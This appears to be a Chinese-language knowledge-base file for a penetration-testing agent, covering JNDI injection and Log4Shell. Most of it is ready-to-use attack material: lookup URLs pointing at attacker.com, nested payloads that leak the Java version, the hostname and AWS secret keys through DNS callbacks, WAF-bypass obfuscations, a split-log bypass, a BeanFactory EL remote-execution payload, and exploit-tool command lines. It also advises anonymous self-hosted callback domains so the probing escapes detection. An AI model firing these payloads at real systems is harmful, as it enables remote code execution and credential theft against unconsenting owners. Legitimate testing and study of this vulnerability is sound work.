# JNDI 注入与 Log4Shell

> `InitialContext.lookup()` 收到攻击者可控 URL 时，JVM 连接攻击者服务器加载/执行代码。Log4Shell（CVE-2021-44228）是其最著名触发面。
> 加载时机: Java 应用对用户输入做 JNDI lookup（Log4j2/Spring/Solr/Fastjson 等），或任何被日志记录的字符串可能进 Log4j2。

## §1 核心机制与攻击向量

```java
Object obj = new InitialContext().lookup(name);  // name = "ldap://attacker.com/Exploit"
```

| 向量 | URL | 说明 |
|---|---|---|
| RMI | `rmi://attacker.com:1099/Exploit` | RMI 服务器返回 Reference → JVM 下载 `http://attacker.com/Exploit.class` 并实例化 |
| LDAP | `ldap://attacker.com:1389/cn=Exploit` | 返回 `javaCodeBase`/`javaFactory`/`javaSerializedData` 属性；**优先用**（限制加得晚: LDAP 8u191 vs RMI 8u121） |
| DNS | `dns://attacker-ns/lookup-name` | **仅检测**——DNS 查询确认注入，无 RCE |

**JDK 版本约束表**（远程类加载）与序列化 gadget 绕过见 `$AGENT_DIR/knowledge-base/deserialization.md`（<8u121 全开 / 8u121-8u190 仅 LDAP / ≥8u191 全禁→LDAP 返回序列化 gadget 走本地 classpath）。

**≥8u191 BeanFactory + EL 绕过**（classpath 有 Tomcat 时）:
```
LDAP 返回: javaClassName: javax.el.ELProcessor
           javaFactory: org.apache.naming.factory.BeanFactory
           forceString: x=eval
           x: Runtime.getRuntime().exec("id")
```

**其他 JNDI sink**: Spring `JndiTemplate.lookup()` / Solr Config API / Druid 配置端点 / VMware vCenter / H2 Console JNDI 连接串 / Fastjson `@type`+`JdbcRowSetImpl.setDataSourceName()`。

## §2 Log4Shell（CVE-2021-44228）

**机制**: Log4j2 对日志消息中的 `${...}` lookup 求值，`jndi` lookup 触发 `InitialContext.lookup()`——**任何被记录的字符串**含 `${jndi:ldap://attacker.com/x}` 即触发。

**检测**（DNS-only 安全确认）:
```
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
```

**信息外带**（嵌套 lookup 拼进域名）:
```
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}          # Java 版本
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net} # AWS 密钥
${jndi:ldap://${hostName}.TOKEN.collab.net}                  # 主机名
```
路径: DNS 确认 → 外带 java.version → 按版本选 RCE。

**注入点**（一切被日志记录的位置）: User-Agent / X-Forwarded-For / Referer / Accept-Language / X-Api-Version / Authorization / Cookie / URL 路径段 / POST body / 搜索词 / 上传文件名 / 表单字段名 / GraphQL variables / SOAP 元素 / JSON 值。

**实战**（Solr）: `GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}` → DNSLog 收到带版本子域名即确认。⚠ 常用公共 dnslog 平台（dnslog.cn/ceye.io 等）特征明显，主流 WAF/流量监控已拉黑——探测用自建匿名 DNS 回调域名，否则别人能发现的 log4j2 你发现不了。

**版本**: Log4j2 2.0-beta9 ~ 2.14.1 受影响；2.15.0 部分修复；2.17.0 完整修复；**Log4j 1.x 不受影响**（无此 lookup 机制）。

## §3 WAF 绕过变形

```
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}      # ::- 默认值技巧
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}     # env 不存在取默认值
```

**Split-Log 绕过**（WAF 检测单请求内成对 `${jndi:}` 时）:
```
请求1: X-Custom: ${jndi:ldap://attacker.com/
请求2: X-Custom: exploit}
```
应用拼接日志条目后重处理（聚合管道/日志重放）时合并触发。

## §4 工具

| 工具 | 用法 |
|---|---|
| marshalsec | `marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389` / `RMIRefServer` 1099 |
| JNDI-Injection-Exploit | `java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip`（自动 RMI+LDAP 多绕过） |
| Rogue JNDI | `--command "id" --hostname attacker.com`（RMI+LDAP+HTTP 全套） |
| ysoserial | `JRMPListener 1099 CommonsCollections1 "id"`（≥8u191 gadget 路线） |

## §5 测试方法论

```
疑似 JNDI 注入点?
├── DNS-only 探针 → DNS 命中 = 确认求值
├── 外带 ${sys:java.version} 判 JDK 版本
├── <8u191 → marshalsec LDAP 远程类直接 RCE
├── ≥8u191 → LDAP 序列化 gadget（classpath 有 CC 等库）/ BeanFactory+EL（有 Tomcat）/ JRMPListener
└── WAF 拦 ${jndi:} → ${${lower:j}ndi:...} 变形
```

## §6 关联文件

- `$AGENT_DIR/knowledge-base/deserialization.md` — JDK 版本约束表、序列化 gadget、ysoserial/marshalsec 详解
- `$AGENT_DIR/knowledge-base/ssti.md` — §6 EL/SpEL 注入（BeanFactory EL 绕过的表达式语法）
